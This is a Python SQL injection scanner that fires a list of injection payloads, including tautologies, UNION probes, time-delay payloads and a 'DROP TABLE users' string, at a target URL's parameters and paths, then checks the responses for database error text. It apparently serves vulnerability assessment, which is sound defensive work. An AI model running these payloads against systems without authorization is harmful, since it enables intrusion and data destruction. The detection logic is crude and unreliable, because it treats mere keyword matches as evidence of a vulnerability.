from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import requests
import re

class SQLInjectionScanner:
    def __init__(self):
        # Common SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' AND '1'='1",
            "1' AND '1'='1' --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "admin'--",
            "admin' #",
            "1' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "1; DROP TABLE users",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(5000000,MD5('A'))--"
        ]
        
        # Common parameter names to test
        self.common_params = [
            'id', 'page', 'user', 'username', 'password', 'search', 
            'q', 'query', 'category', 'product', 'item', 'order', 
            'sort', 'dir', 'offset', 'start', 'limit', 'file', 
            'doc', 'report', 'login', 'token', 'email'
        ]
        
        # Error patterns indicating SQL injection
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"Warning.*sqlite_.*",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLite exception",
            r"unterminated .* quote",
            r"syntax error .* SQL",
            r"ORA-\d{5}",
            r"Microsoft SQL Native Client error",
            r"\[ODBC SQL Server Driver\]",
            r"SQLSTATE\[\d{5}\]"
        ]
    
    def scan_url(self, url: str) -> List[Dict]:
        """Scan URL for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Test reflected SQLi in URL parameters
        reflected_vulns = self._test_parameter_sqli(url)
        vulnerabilities.extend(reflected_vulns)
        
        # Test URL path for SQLi
        path_vulns = self._test_path_sqli(url)
        vulnerabilities.extend(path_vulns)
        
        return vulnerabilities
    
    def _test_parameter_sqli(self, url: str) -> List[Dict]:
        """Test URL parameters for SQL injection"""
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # If URL has parameters, test them
            if params:
                for param_name in params:
                    for payload in self.payloads[:5]:  # Test first 5 payloads
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        
                        if self._check_sqli_vulnerability(test_url := self._build_test_url(url, test_params), payload):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'description': f'Potential SQL injection in parameter "{param_name}" with payload: {payload[:30]}...',
                                'severity': 'Critical',
                                'cvss_score': 9.5,
                                'remediation': f'Use parameterized queries (prepared statements) for parameter "{param_name}", validate and sanitize all user inputs'
                            })
                            break  # Found vulnerability, move to next parameter
            else:
                # Try common parameter names
                for param_name in self.common_params[:3]:
                    for payload in self.payloads[:3]:
                        test_params = {param_name: payload}
                        test_url = self._build_test_url(url, test_params)
                        
                        if self._check_sqli_vulnerability(test_url, payload):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'description': f'Potential SQL injection in parameter "{param_name}"',
                                'severity': 'Critical',
                                'cvss_score': 9.5,
                                'remediation': f'Use parameterized queries for parameter "{param_name}", implement input validation'
                            })
                            break
        
        except Exception as e:
            print(f"Error testing SQL injection: {str(e)}")
        
        return vulnerabilities
    
    def _test_path_sqli(self, url: str) -> List[Dict]:
        """Test URL path for SQL injection"""
        vulnerabilities = []
        
        try:
            # Test URL path for SQL injection patterns
            dangerous_paths = ['/admin', '/user', '/login', '/search', '/product', '/item']
            
            for path in dangerous_paths:
                test_url = url.rstrip('/') + path + "/' OR '1'='1"
                if self._check_sqli_vulnerability(test_url, "' OR '1'='1"):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'description': f'Potential SQL injection in URL path: {path}',
                        'severity': 'High',
                        'cvss_score': 8.0,
                        'remediation': 'Implement proper input validation and use parameterized queries for path parameters'
                    })
                    break
        
        except Exception as e:
            print(f"Error testing path SQL injection: {str(e)}")
        
        return vulnerabilities
    
    def _build_test_url(self, base_url: str, params: dict) -> str:
        """Build URL with test parameters"""
        parsed = urlparse(base_url)
        query_string = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query_string,
            parsed.fragment
        ))
    
    def _check_sqli_vulnerability(self, test_url: str, payload: str) -> bool:
        """Check if URL is vulnerable to SQL injection"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            # Make request with payload
            response = requests.get(test_url, headers=headers, timeout=10)
            response_text = response.text.lower()
            
            # Check for SQL error patterns in response
            for pattern in self.error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            # Check for common SQL injection indicators
            sql_indicators = [
                'sql syntax',
                'mysql',
                'postgresql',
                'sqlite',
                'ora-',
                'microsoft sql',
                'odbc',
                'syntax error',
                'unterminated',
                'sqlstate',
                'warning mysql',
                'warning pg'
            ]
            
            for indicator in sql_indicators:
                if indicator in response_text:
                    return True
            
            # Check for database-specific error messages
            db_errors = [
                'you have an error in your sql syntax',
                'check the manual that corresponds to your mysql',
                'warning: mysql',
                'psql: error',
                'pg:',
                'sqlite_error',
                'sqlserver error',
                'invalid query',
                'data type mismatch',
                'could not prepare statement'
            ]
            
            for error in db_errors:
                if error in response_text:
                    return True
            
            return False
            
        except requests.RequestException as e:
            print(f"Error checking SQLi vulnerability: {str(e)}")
            return False


# Convenience function
def scan_sqli(url: str) -> List[Dict]:
    """Simple function to scan for SQL injection vulnerabilities"""
    scanner = SQLInjectionScanner()
    return scanner.scan_url(url)
